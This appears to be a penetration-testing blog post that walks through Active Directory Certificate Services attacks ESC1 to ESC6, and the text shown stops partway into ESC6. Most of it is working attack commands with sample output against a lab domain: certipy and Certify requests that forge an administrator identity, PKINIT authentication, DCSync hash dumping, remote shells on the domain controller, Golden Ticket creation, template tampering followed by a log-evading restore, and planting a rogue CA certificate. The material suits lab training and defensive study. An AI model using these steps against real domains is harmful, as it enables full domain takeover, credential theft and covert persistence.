---
title: "ADCS Attacks Deep Dive: ESC1 to ESC11 — Visual Exploitation Guide"
date: 2026-03-28 13:40:00 +0200
categories: [Security, Active Directory]
tags: [adcs, active-directory, red-team, pentest, esc1, esc2, esc3, esc4, esc5, esc6, esc7, esc8, esc9, esc10, esc11, certificates, pki, domain-controller, exploit]
image:
  path: https://i.imgur.com/8XQ7zKl.png
  alt: ADCS Attack Paths
---

> **For authorized penetration testing and educational purposes only.**

---

## Lab Environment

```
┌─────────────────────────────────────────────────────────────────┐
│                    CORP.LOCAL — 192.168.10.0/24                  │
│                                                                   │
│  ┌─────────────────┐    ┌─────────────────┐    ┌─────────────┐  │
│  │  DC01            │    │  CA01            │    │  SRV01      │  │
│  │  192.168.10.10   │    │  192.168.10.20   │    │ 192.168.10  │  │
│  │  Windows Server  │    │  Windows Server  │    │    .30      │  │
│  │  2022            │    │  2022 + ADCS     │    │             │  │
│  │  Domain Ctrl     │◄───│  Corp-CA         │    │ Member Srv  │  │
│  └─────────────────┘    └─────────────────┘    └─────────────┘  │
│           ▲                      ▲                                │
│           │                      │                                │
│  ┌─────────────────┐    ┌─────────────────┐                      │
│  │  WS01            │    │  KALI (ATTACKER)│                      │
│  │  192.168.10.50   │    │  192.168.10.99  │                      │
│  │  Windows 10      │    │  Kali Linux     │                      │
│  │  Victim WS       │    │  Attack Box     │                      │
│  └─────────────────┘    └─────────────────┘                      │
└─────────────────────────────────────────────────────────────────┘

Domain Accounts:
  administrator@corp.local  → Domain Admin (target)
  lowpriv@corp.local        → Domain User  (attacker's foothold)
  victimuser@corp.local     → Domain User  (used as pivot)
  pkiadmin@corp.local       → PKI Admin    (has ManageCA)
  svcaccount@corp.local     → Service Account

CA Name:  Corp-CA
CA FQDN:  ca01.corp.local\Corp-CA
```

---

## How ADCS Authentication Works (The Big Picture)

Understanding why ADCS attacks are so powerful starts with understanding **how certificates become identity**.

```
┌──────────────────────────────────────────────────────────────────────┐
│                  NORMAL KERBEROS (Password Auth)                      │
│                                                                        │
│  [User]──password──►[DC: AS-REQ]──validates hash──►[TGT issued]       │
│                                                                        │
│                  PKINIT (Certificate Auth)                             │
│                                                                        │
│  [User]──certificate──►[DC: AS-REQ]                                   │
│                              │                                         │
│                              ▼                                         │
│                    Is cert signed by trusted CA?  ──NO──► Rejected     │
│                              │ YES                                     │
│                              ▼                                         │
│                    Extract UPN from certificate SAN                    │
│                              │                                         │
│                              ▼                                         │
│                    Map UPN → AD User Account                           │
│                              │                                         │
│                              ▼                                         │
│                    Issue TGT as that user  ◄── ATTACKER ABUSES THIS   │
└──────────────────────────────────────────────────────────────────────┘
```

### The Critical Flaw

```
┌──────────────────────────────────────────────────────┐
│  DC DOES NOT CHECK:                                   │
│    ✗  Who actually requested the certificate          │
│    ✗  Whether requester's identity matches SAN        │
│    ✗  When the certificate was issued                 │
│                                                       │
│  DC ONLY CHECKS:                                      │
│    ✓  Is the CA in NTAuthCertificates?                │
│    ✓  Is the cert signature valid?                    │
│    ✓  Is the cert expired?                            │
│    ✓  UPN in SAN → map to AD account                 │
└──────────────────────────────────────────────────────┘
```

### Certificate Template Architecture

```
Active Directory Structure
│
├── CN=Configuration
│   └── CN=Services
│       └── CN=Public Key Services
│           ├── CN=Certificate Templates    ◄─── Template objects live here
│           │   ├── CN=User                      Each has an ACL, flags, EKUs
│           │   ├── CN=Machine
│           │   ├── CN=DomainController
│           │   └── CN=<CustomTemplates>
│           │
│           ├── CN=Enrollment Services     ◄─── CA objects live here
│           │   └── CN=Corp-CA
│           │
│           ├── CN=NTAuthCertificates      ◄─── Trusted CA certs live here
│           │                                   ANY cert in here = trusted for auth
│           ├── CN=AIA                     ◄─── CA cert distribution
│           └── CN=CDP                     ◄─── Certificate Revocation Lists
```

### What Makes a Template Exploitable

```
Template: "VulnWebTemplate"
┌────────────────────────────────────────────────────────────┐
│  msPKI-Certificate-Name-Flag:                               │
│    [✓] ENROLLEE_SUPPLIES_SUBJECT  ← ESC1 FLAG              │
│                                                             │
│  msPKI-Enrollment-Flag:                                     │
│    [ ] PEND_ALL_REQUESTS          ← No manager approval     │
│                                                             │
│  pKIExtendedKeyUsage:                                       │
│    [✓] Client Authentication      ← Auth EKU               │
│                                                             │
│  nTSecurityDescriptor (ACL):                                │
│    CORP\Domain Users: Enroll      ← Anyone can enroll!     │
└────────────────────────────────────────────────────────────┘
        ALL FOUR = DOMAIN ADMIN IN MINUTES
```

---

## Tool Setup

```bash
# ════════════════════════════════════════════════
#  KALI LINUX (192.168.10.99) — Install Everything
# ════════════════════════════════════════════════

# Certipy — primary ADCS attack tool
pip install certipy-ad

# Impacket — DCSync, relay, auth
pip install impacket

# PetitPotam — coercion
git clone https://github.com/topotam/PetitPotam.git

# Coercer — all coercion methods
pip install coercer

# Verify
certipy --version
python3 -c "import impacket; print('impacket ok')"

# ════════════════════════════════════
#  WINDOWS FOOTHOLD — Download Binaries
# ════════════════════════════════════
# Certify.exe  → https://github.com/GhostPack/Certify
# Rubeus.exe   → https://github.com/GhostPack/Rubeus
```

---

## ESC1 — Subject Alternative Name Abuse

### The Vulnerability Explained

```
┌─────────────────────────────────────────────────────────────────┐
│                    WHY ESC1 EXISTS                               │
│                                                                   │
│  LEGITIMATE USE CASE:                                             │
│  Web admin needs cert for "webserver.corp.local" AND             │
│  "www.corp.local" AND "internal.corp.local"                      │
│  → Admin enables "Supply in the request" (EnrolleeSuppliesSubject)│
│                                                                   │
│  THE PROBLEM:                                                     │
│  Same template also has Client Authentication EKU                 │
│  CA doesn't verify if SAN belongs to the requester               │
│  Anyone can put ANYONE's UPN in the SAN                          │
│                                                                   │
│  RESULT:                                                          │
│  lowpriv requests cert with SAN = administrator@corp.local        │
│  CA says "OK here's your cert for administrator"                  │
│  DC says "cert from trusted CA? SAN = admin? Here's your TGT"    │
└─────────────────────────────────────────────────────────────────┘
```

### Attack Flow Diagram

```
[lowpriv@corp.local] ──────────────────────────────────────────────►
        │                                                            │
        │  Step 1: Enumerate                                         │
        ▼                                                            │
[certipy find --vulnerable]                                          │
        │                                                            │
        │  Finds: VulnWebTemplate                                    │
        │    - EnrolleeSuppliesSubject = TRUE                        │
        │    - Client Authentication EKU                             │
        │    - Domain Users can Enroll                               │
        │    - No Manager Approval                                   │
        │                                                            │
        │  Step 2: Request cert with fake SAN                        │
        ▼                                                            │
[certipy req -upn administrator@corp.local]                          │
        │                                                            │
        │  CSR sent to CA01 (192.168.10.20)                          │
        │  Contains: SAN = administrator@corp.local                  │
        │  CA checks: Does lowpriv have Enroll right? YES            │
        │  CA does NOT check: Is SAN = requester? IGNORED            │
        │                                                            │
        ▼                                                            │
[CA01 issues cert with SAN=administrator@corp.local] ──────────────►│
        │                                                            │
        │  Step 3: Authenticate with cert                            │
        ▼                                                            │
[certipy auth -pfx administrator.pfx]                                │
        │                                                            │
        │  AS-REQ (PKINIT) sent to DC01 (192.168.10.10)             │
        │  DC sees: cert from Corp-CA (trusted) + SAN=administrator  │
        │  DC issues TGT for administrator                           │
        │  DC also returns NTLM hash via U2U                         │
        │                                                            │
        ▼                                                            │
[TGT + NTLM hash for administrator]                                  │
        │                                                            │
        │  Step 4: DCSync                                            │
        ▼                                                            │
[secretsdump → ALL domain hashes] ─────────────────────────────────►│
                                                              GAME OVER
```

### Step-by-Step Exploitation

**Step 1 — Enumerate vulnerable templates**

```bash
# From Kali (192.168.10.99)
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10 \
  -vulnerable \
  -stdout

# ══ OUTPUT ══════════════════════════════════════════════════════
# Certificate Templates
#   0
#     Template Name              : VulnWebTemplate
#     Display Name               : Vulnerable Web Template
#     Certificate Authorities    : Corp-CA
#     Enabled                    : True
#     Client Authentication      : True         ← Must be TRUE
#     Enrollment Agent           : False
#     Any Purpose                : False
#     Enrollee Supplies Subject  : True          ← THE DANGEROUS FLAG
#     Certificate Name Flags     : EnrolleeSuppliesSubject
#     Enrollment Flags           : None
#     Extended Key Usage         : Client Authentication
#     Requires Manager Approval  : False         ← Must be FALSE
#     Permissions
#       Enrollment Rights        : CORP.LOCAL\Domain Users  ← Must include us
```

```powershell
# Windows (from foothold on WS01 192.168.10.50)
.\Certify.exe find /vulnerable

# ══ OUTPUT ══════════════════════════════════════════════════════
# [!] Vulnerable Certificates Templates :
#     CA Name           : ca01.corp.local\Corp-CA
#     Template Name     : VulnWebTemplate
#     Enrollee Supplies Subject  : True
#     Client Authentication      : True
#     Enrollment Rights          : CORP\Domain Users
```

**Step 2 — Request certificate as administrator**

```bash
# Kali — request cert claiming to be administrator
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'VulnWebTemplate' \
  -upn 'administrator@corp.local' \
  -target ca01.corp.local \
  -dc-ip 192.168.10.10

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Requesting certificate via RPC
# [*] Successfully requested certificate
# [*] Request ID is 23
# [*] Got certificate with UPN 'administrator@corp.local'
# [*] Certificate object SID is 'S-1-5-21-...-500'
# [*] Saved certificate and private key to 'administrator.pfx'
```

```powershell
# Windows — Certify request
.\Certify.exe request /ca:ca01.corp.local\Corp-CA /template:VulnWebTemplate /altname:administrator

# Then convert PEM → PFX
openssl pkcs12 -in cert.pem -keyex `
  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" `
  -export -out admin.pfx -passout pass:''
```

**Step 3 — Authenticate with the certificate (Linux)**

```bash
# PKINIT authentication → TGT + NTLM hash
certipy auth \
  -pfx administrator.pfx \
  -dc-ip 192.168.10.10

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Using principal: administrator@corp.local
# [*] Trying to get TGT...
# [*] Got TGT
# [*] Saved credential cache to 'administrator.ccache'
# [*] Trying to retrieve NT hash for 'administrator'
# [*] Got hash for 'administrator@corp.local':
#     aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
```

**Step 4 — DCSync all domain hashes**

```bash
# Option A: DCSync directly
python3 secretsdump.py \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71' \
  'corp.local/administrator@192.168.10.10'

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:19e9b6b62bd6e15f3a5bcf1c6f3e4d2a:::
# lowpriv:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
# [... all users ...]

# Option B: Shell on DC01
python3 wmiexec.py \
  -hashes ':58a478135a93ac3bf058a5ea0e8fdb71' \
  'corp.local/administrator@192.168.10.10'

# ══ OUTPUT ══════════════════════════════════════════════════════
# Impacket v0.12.0 - Copyright 2023 Fortra
# [*] SMBv3.0 dialect used
# [!] Launching semi-interactive shell - Careful what you execute
# C:\Windows\system32>whoami
# corp\administrator
# C:\Windows\system32>hostname
# DC01
```

**Step 5 — Pass-the-Certificate on Windows**

```powershell
# Inject TGT directly into current session — no password needed
.\Rubeus.exe asktgt \
  /user:administrator \
  /certificate:admin.pfx \
  /password:'' \
  /domain:corp.local \
  /dc:192.168.10.10 \
  /ptt

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Action: Ask TGT
# [*] Using PKINIT with etype rc4_hmac
# [*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.local\administrator'
# [+] TGT request successful!
# [+] Ticket successfully imported!

klist
# Current LogonId is 0:0x62d3f
# Cached Tickets: (1)
#   #0>  Client: administrator @ CORP.LOCAL
#        Server: krbtgt/CORP.LOCAL @ CORP.LOCAL
#        End Time: 3/29/2026 0:00:00

# Access DC share
dir \\192.168.10.10\c$
# Volume in drive \\192.168.10.10\c$ is Windows
# 03/28/2026  12:00    <DIR>  inetpub
# 03/28/2026  12:00    <DIR>  PerfLogs
# [...]
```

---

## ESC2 — Any Purpose / No EKU

### The Vulnerability Explained

```
┌────────────────────────────────────────────────────────────────┐
│              EKU (Extended Key Usage) Explained                 │
│                                                                  │
│  EKU = "what is this certificate allowed to do?"                │
│                                                                  │
│  1.3.6.1.5.5.7.3.1  → Server Authentication (TLS)              │
│  1.3.6.1.5.5.7.3.2  → Client Authentication  ← needed for auth │
│  1.3.6.1.4.1.311.20.2.1 → Enrollment Agent   ← ESC3 power      │
│  2.5.29.37.0         → ANY PURPOSE            ← dangerous       │
│  (empty)             → NO RESTRICTION         ← also dangerous  │
│                                                                  │
│  X.509 STANDARD RULE:                                           │
│    Empty EKU = Certificate can be used for ANYTHING             │
│    Any Purpose = Same result                                     │
│                                                                  │
│  WINDOWS BEHAVIOR:                                              │
│    Any Purpose cert → usable for Client Authentication          │
│    Any Purpose cert → usable as Enrollment Agent cert           │
│    No EKU cert      → can act as SubCA (sign other certs!)      │
└────────────────────────────────────────────────────────────────┘
```

### Attack Paths from ESC2

```
        ESC2 Certificate Obtained
               │
        ┌──────┴──────────────────────┐
        │                             │
        ▼                             ▼
   Path A:                       Path B:
   Direct Auth                   Use as Enrollment Agent
   (Client Auth EKU               → ESC3 Attack Chain
    implied by Any Purpose)       → Request cert for any user
        │                             │
        ▼                             ▼
   certipy auth                  certipy req --on-behalf-of
   → TGT for yourself            → TGT for Domain Admin
        │                             │
        └──────────┬──────────────────┘
                   ▼
              Domain Admin
```

### Step-by-Step Exploitation

**Step 1 — Find the Any Purpose template**

```bash
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10 \
  -vulnerable

# Look for:
# Any Purpose           : True
# OR
# Extended Key Usage    : (empty)
```

**Step 2 — Request the certificate**

```bash
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'AnyPurposeTemplate' \
  -dc-ip 192.168.10.10

# Saved to: lowpriv.pfx (Any Purpose EKU)
```

**Step 3a — Authenticate directly (Any Purpose → Client Auth)**

```bash
certipy auth \
  -pfx lowpriv.pfx \
  -dc-ip 192.168.10.10 \
  -username lowpriv \
  -domain corp.local
# → TGT + hash for lowpriv (useful for persistence even if not DA)
```

**Step 3b — Use as Enrollment Agent to request for admin**

```bash
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'User' \
  -on-behalf-of 'corp\administrator' \
  -pfx lowpriv.pfx \
  -dc-ip 192.168.10.10

# [*] Got certificate with UPN 'administrator@corp.local'
# [*] Saved to: administrator.pfx

certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
# → Hash for administrator
```

**Step 3c — Use No-EKU cert as Sub-CA to forge certs**

```bash
# If the cert has NO EKU it can sign other certificates

# Generate target cert
openssl req -newkey rsa:2048 -keyout forged.key -out forged.csr -nodes \
  -subj "/CN=administrator"

# Sign with our No-EKU cert (acting as Sub-CA)
openssl x509 -req -in forged.csr \
  -CA lowpriv.crt -CAkey lowpriv.key \
  -CAcreateserial -out forged.crt -days 365 \
  -extfile <(echo "[ext]
subjectAltName=otherName:1.3.6.1.4.1.311.20.2.3;UTF8:administrator@corp.local")

openssl pkcs12 -export \
  -in forged.crt -inkey forged.key \
  -out forged_admin.pfx -passout pass:''

certipy auth -pfx forged_admin.pfx -dc-ip 192.168.10.10
```

---

## ESC3 — Enrollment Agent Chain Attack

### How the Enrollment Agent System Works

```
┌──────────────────────────────────────────────────────────────────┐
│              LEGITIMATE ENROLLMENT AGENT FLOW                     │
│                                                                    │
│  [Helpdesk Staff]                                                  │
│       │                                                            │
│       │  Has Enrollment Agent Certificate                          │
│       │  (EKU: Certificate Request Agent)                          │
│       │                                                            │
│       │  "User Bob lost his smart card, I need to                 │
│       │   re-issue a certificate for him"                          │
│       │                                                            │
│       ▼                                                            │
│  [CA] ← Request: "I (helpdesk) request cert for Bob"             │
│       │           using my enrollment agent cert                   │
│       │                                                            │
│       ▼                                                            │
│  [Cert issued to Bob, signed by helpdesk's agent cert]            │
└──────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────┐
│              ATTACKER ABUSE                                        │
│                                                                    │
│  [lowpriv@corp.local]                                              │
│       │                                                            │
│       │  Gets Enrollment Agent cert (from misconfigured template)  │
│       │                                                            │
│       ▼                                                            │
│  [CA] ← "I (lowpriv) request cert for administrator"             │
│            using my enrollment agent cert                          │
│            CA has NO enrollment agent restrictions                 │
│       │                                                            │
│       ▼                                                            │
│  [Cert issued for administrator] → PKINIT → Domain Admin          │
└──────────────────────────────────────────────────────────────────┘
```

### The Two-Template Chain

```
Template Chain for ESC3:

  ┌────────────────────────┐    ┌────────────────────────────┐
  │  ESC3-1 Template        │    │  ESC3-2 Template            │
  │  "EnrollmentAgent"      │    │  "User" (built-in)          │
  │                         │    │                              │
  │  EKU:                   │    │  EKU:                        │
  │  Certificate Request    │    │  Client Authentication       │
  │  Agent                  │    │                              │
  │                         │    │  Enrollment Agent            │
  │  Who can enroll:        │    │  Restrictions: NONE          │
  │  Domain Users ← BAD     │    │  (any EA can enroll)         │
  └────────────────────────┘    └────────────────────────────┘
          │                               │
          │  Step 1: Get EA cert          │  Step 2: Use EA cert
          └─────────────────────►─────────┘
                                          │
                                          ▼
                             Request cert on behalf of
                             administrator → Domain Admin
```

### Step-by-Step Exploitation

**Step 1 — Find both templates**

```bash
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10 \
  -vulnerable

# Looking for ESC3-1:
# Enrollment Agent      : True
# Enrollment Rights     : Domain Users
# Requires Approval     : False

# Looking for ESC3-2:
# Client Authentication : True
# RA Application Policies: (empty — no restrictions on who can enroll via EA)
```

**Step 2 — Get enrollment agent certificate**

```bash
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'EnrollmentAgentTemplate' \
  -dc-ip 192.168.10.10

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Requesting certificate via RPC
# [*] Got certificate with EKU 'Certificate Request Agent'
# [*] Saved certificate and private key to 'lowpriv.pfx'
```

**Step 3 — Use EA cert to enroll on behalf of administrator**

```bash
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'User' \
  -on-behalf-of 'corp\administrator' \
  -pfx lowpriv.pfx \
  -dc-ip 192.168.10.10

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Requesting certificate via RPC (on behalf of 'corp\administrator')
# [*] Successfully requested certificate
# [*] Got certificate with UPN 'administrator@corp.local'
# [*] Saved certificate and private key to 'administrator.pfx'
```

**Step 4 — Escalate to any user including krbtgt**

```bash
# Get cert for krbtgt → persistent Golden Ticket material
certipy req \
  -u lowpriv@corp.local -p 'Password123!' \
  -ca 'Corp-CA' -template 'User' \
  -on-behalf-of 'corp\krbtgt' \
  -pfx lowpriv.pfx -dc-ip 192.168.10.10

certipy auth \
  -pfx krbtgt.pfx \
  -dc-ip 192.168.10.10 \
  -username krbtgt \
  -domain corp.local

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Got hash for 'krbtgt@corp.local':
#     aad3b435b51404eeaad3b435b51404ee:19e9b6b62bd6e15f3a5bcf1c6f3e4d2a

# Create Golden Ticket (unlimited persistence!)
python3 ticketer.py \
  -nthash 19e9b6b62bd6e15f3a5bcf1c6f3e4d2a \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain corp.local \
  administrator

export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass dc01.corp.local
```

---

## ESC4 — Writable Template ACL

### Understanding AD Object ACLs

```
Every certificate template is an AD object:
CN=VulnTemplate,CN=Certificate Templates,...

That object has an ACL with these possible rights:

┌──────────────────────────────────────────────────────────┐
│  RIGHT               │  WHAT IT ALLOWS                   │
├──────────────────────┼───────────────────────────────────┤
│  GenericAll          │  Full control — do anything        │
│  GenericWrite        │  Write any property                │
│  WriteOwner          │  Change owner → gain GenericAll    │
│  WriteDacl           │  Change ACL → grant yourself power │
│  WriteProperty       │  Modify specific attributes        │
│                      │  (msPKI-Certificate-Name-Flag)     │
└──────────────────────┴───────────────────────────────────┘

If Domain Users (or the attacker's account) has ANY of these
on a template → ESC4 → attacker can modify the template to
enable ESC1 conditions → ESC1 exploit → Domain Admin
```

### The Modify → Exploit → Restore Cycle

```
Timeline:
T=0s   Attacker discovers GenericWrite on "CorpTemplate"
T=2s   Save original config (certipy template --save-old)
T=4s   Modify: enable EnrolleeSuppliesSubject + Client Auth EKU
T=6s   Request cert with admin SAN
T=8s   Cert issued (VulnTemplate now acts as ESC1)
T=10s  Authenticate → get admin NTLM hash
T=12s  Restore original template config
T=60s  DCSync all domain credentials
       Template looks completely normal in logs

Total attack window: ~60 seconds
Forensic evidence: minimal (just a cert request in CA audit log)
```

### Step-by-Step Exploitation

**Step 1 — Find templates with write permissions**

```bash
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10 \
  -vulnerable

# Look for under "Object Control Permissions":
# Write Owner Principals    : CORP\Domain Users  ← VULNERABLE
# Write Dacl Principals     : CORP\Domain Users  ← VULNERABLE
# Write Property Principals : CORP\Domain Users  ← VULNERABLE
```

```powershell
# PowerView — detailed ACL check
Import-Module .\PowerView.ps1

# Get all template ACEs for Domain Users
$templatePath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
Get-DomainObjectAcl -SearchBase $templatePath -ResolveGUIDs |
  Where-Object {
    $_.ActiveDirectoryRights -match "Write|GenericAll" -and
    $_.SecurityIdentifier -match "S-1-5-21-.*-513"  # Domain Users SID ends in -513
  } |
  Select ObjectDN, ActiveDirectoryRights, SecurityIdentifier

# Output:
# ObjectDN              : CN=CorpTemplate,CN=Certificate Templates,...
# ActiveDirectoryRights : GenericWrite
# SecurityIdentifier    : S-1-5-21-...-513  (Domain Users)
```

**Step 2 — Modify template to enable ESC1 (auto method)**

```bash
# Save original config then modify
certipy template \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -template 'CorpTemplate' \
  -save-old \
  -dc-ip 192.168.10.10

# ══ OUTPUT ══════════════════════════════════════════════════════
# [*] Updating certificate template 'CorpTemplate'
# [*] Successfully updated 'CorpTemplate'
# Modified flags:
#   msPKI-Certificate-Name-Flag: added ENROLLEE_SUPPLIES_SUBJECT
#   msPKI-Enrollment-Flag:       removed PEND_ALL_REQUESTS
#   pKIExtendedKeyUsage:         added Client Authentication
# Template backup saved to: CorpTemplate.json
```

**Step 2 alt — Manual ADSI modification**

```powershell
# Manual surgical approach
$templateDN = "LDAP://CN=CorpTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
$template = [ADSI]$templateDN

# Enable EnrolleeSuppliesSubject (bit 0x1)
$current = $template.Properties["msPKI-Certificate-Name-Flag"].Value
$template.Properties["msPKI-Certificate-Name-Flag"].Value = $current -bor 0x1

# Remove manager approval (bit 0x2 = PEND_ALL_REQUESTS)
$enrollFlags = $template.Properties["msPKI-Enrollment-Flag"].Value
$template.Properties["msPKI-Enrollment-Flag"].Value = $enrollFlags -band (-bnot 0x2)

# Add Client Authentication EKU
$template.Properties["pKIExtendedKeyUsage"].Add("1.3.6.1.5.5.7.3.2")

$template.CommitChanges()
Write-Host "[+] Template modified! Now it's ESC1-vulnerable."
```

**Step 3 — Exploit as ESC1**

```bash
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'CorpTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 192.168.10.10

certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
# [*] Got hash for 'administrator@corp.local': aad3b435...:58a478135a93ac3bf058a5ea0e8fdb71
```

**Step 4 — Restore template (stealth)**

```bash
certipy template \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -template 'CorpTemplate' \
  -configuration CorpTemplate.json \
  -dc-ip 192.168.10.10

# [*] Successfully restored 'CorpTemplate'
# Template is back to normal — looks like nothing happened
```

**Step 5 — DCSync**

```bash
python3 secretsdump.py \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71' \
  'corp.local/administrator@192.168.10.10'
```

---

## ESC5 — Vulnerable PKI Object ACL

### The NTAuthCertificates Trust Chain

```
┌───────────────────────────────────────────────────────────────────┐
│                    HOW CA TRUST WORKS IN AD                        │
│                                                                     │
│  NTAuthCertificates (AD Object)                                    │
│  ┌─────────────────────────────────────────────────────────────┐  │
│  │  cACertificate attribute contains:                           │  │
│  │    [Corp-CA Root Certificate]                                │  │
│  │    [Third-Party CA Certificate]                              │  │
│  │    [<-- ATTACKER ADDS ROGUE CA CERT HERE]                   │  │
│  └─────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  Any certificate signed by any CA in this list                     │
│  is UNCONDITIONALLY trusted by ALL domain controllers              │
│  for PKINIT authentication                                         │
│                                                                     │
│  ATTACKER PLAN:                                                     │
│  1. Get write on NTAuthCertificates                                │
│  2. Generate self-signed "Corp-CA" certificate                     │
│  3. Add it to NTAuthCertificates                                   │
│  4. Forge a cert for administrator signed by our fake CA           │
│  5. DC trusts it → Domain Admin                                    │
└───────────────────────────────────────────────────────────────────┘
```

### PKI Objects Attack Surface

```
┌─────────────────────────────────────────────────────────────────┐
│  SENSITIVE PKI OBJECTS AND THEIR IMPACT                          │
│                                                                   │
│  Object                  Write Access Impact                      │
│  ──────────────────────  ──────────────────────────────────      │
│  NTAuthCertificates      Add rogue CA → forge any cert          │
│  Enrollment Services     Modify CA config, change templates     │
│  CA Computer Object      Shadow Credentials → CA takeover       │
│  AIA Container           Modify CA cert distribution            │
│  CDP Container           Tamper with revocation                 │
│                                                                   │
│  ALL of these = effectively same as owning the CA               │
└─────────────────────────────────────────────────────────────────┘
```

### Step-by-Step Exploitation

**Step 1 — Check write access on NTAuthCertificates**

```bash
# Certipy
certipy find -u lowpriv@corp.local -p 'Password123!' -dc-ip 192.168.10.10 -stdout

# PowerView
Import-Module .\PowerView.ps1
Get-DomainObjectAcl -Identity "NTAuthCertificates" -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match "Write|GenericAll" }
```

**Step 2 — Generate rogue CA certificate**

```bash
# Create self-signed CA certificate mimicking Corp-CA
openssl req -x509 \
  -newkey rsa:4096 \
  -keyout rogueCA.key \
  -out rogueCA.crt \
  -days 3650 \
  -nodes \
  -subj "/CN=Corp-CA/DC=corp/DC=local" \
  -addext "basicConstraints=critical,CA:TRUE" \
  -addext "keyUsage=critical,keyCertSign,cRLSign"

# Verify it looks like a CA
openssl x509 -in rogueCA.crt -text -noout | grep -A 3 "Basic Constraints"
# Basic Constraints: critical
#   CA:TRUE
```

**Step 3 — Add rogue CA to NTAuthCertificates**

```powershell
# Windows — add rogue CA cert to NTAuth store
certutil -dspublish -f rogueCA.crt NTAuthCA

# OR via ADSI directly:
$ntauth = [ADSI]"LDAP://CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
$certBytes = [System.IO.File]::ReadAllBytes("C:\rogueCA.crt")
$ntauth.Properties["cACertificate"].Add($certBytes)
$ntauth.CommitChanges()
Write-Host "[+] Rogue CA added to NTAuthCertificates!"
Write-Host "[+] All DCs now trust certs signed by our fake CA!"
```

**Step 4 — Create forged certificate for administrator**

```bash
# Generate key + CSR for administrator
openssl req -newkey rsa:2048 \
  -keyout admin_forged.key \
  -out admin_forged.csr \
  -nodes \
  -subj "/CN=administrator"

# Sign with our rogue CA, embed admin UPN in SAN
cat > san.conf << 'EOF'
[req]
req_extensions = v3_req
[v3_req]
subjectAltName = @alt_names
[alt_names]
otherName.1 = 1.3.6.1.4.1.311.20.2.3;UTF8:administrator@corp.local
EOF

openssl x509 -req \
  -in admin_forged.csr \
  -CA rogueCA.crt \
  -CAkey rogueCA.key \
  -CAcreateserial \
  -out admin_forged.crt \
  -days 365 \
  -extfile san.conf \
  -extensions v3_req

# Bundle as PFX
openssl pkcs12 -export \
  -in admin_forged.crt \
  -inkey admin_forged.key \
  -certfile rogueCA.crt \
  -out admin_forged.pfx \
  -passout pass:''
```

**Step 5 — Authenticate with forged certificate**

```bash
certipy auth \
  -pfx admin_forged.pfx \
  -dc-ip 192.168.10.10 \
  -username administrator \
  -domain corp.local

# DC checks:
# ✓ Is rogueCA.crt in NTAuthCertificates? YES (we added it)
# ✓ Is cert signature valid? YES (signed by rogueCA)
# ✓ UPN = administrator@corp.local → map to Administrator account
# → TGT ISSUED AS ADMINISTRATOR

# [*] Got hash for 'administrator@corp.local': aad3b435...:58a478135a93ac3bf058a5ea0e8fdb71
```

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag

### How the CA Flag Overrides Everything

```
┌───────────────────────────────────────────────────────────────┐
│                CA01 Registry (192.168.10.20)                   │
│                                                                 │
│  HKLM\SYSTEM\...\CertSvc\Configuration\Corp-CA\               │
│    PolicyModules\...\EditFlags                                  │
│                                                                 │
│  Normal (safe):                                                 │
│    EditFlags = 0x15014e                                         │
│    (does NOT contain EDITF_ATTRIBUTESUBJECTALTNAME2)            │
│                                                                 │
│  Vulnerable:                                                    │
│    EditFlags = 0x15014e | 0x00040000                            │
│             = 0x19014e                                          │
│    (EDITF_ATTRIBUTESUBJECTALTNAME2 bit is SET)                  │
│                                                                 │
│  Effect when set:                                               │
│    ANY certificate request to THIS CA can include               │
│    a user-specified SAN — for ANY template                      │
│                                                                 │
│    Template's own EnrolleeSuppliesSubject flag? IRRELEVANT      │
